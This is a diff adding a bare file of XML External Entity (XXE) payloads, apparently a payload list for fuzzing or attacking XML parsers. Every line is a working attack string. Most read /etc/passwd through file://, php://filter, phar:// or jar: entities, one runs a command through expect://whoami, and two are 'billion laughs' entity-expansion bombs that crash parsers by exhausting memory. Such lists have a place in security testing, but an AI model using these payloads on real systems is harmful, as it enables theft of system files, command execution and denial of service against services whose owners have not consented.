@@ -1,0 +1,7 @@
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "expect://whoami">]><data>&xxe;</data>
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "phar:///etc/passwd">]><data>&xxe;</data>
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "LOL"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><lolz>&c;</lolz>
+<!DOCTYPE data [<!ENTITY a0 "lol"><!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;"><!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;"><!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;"><!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">]><data>&a4;</data>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/file.txt">]>
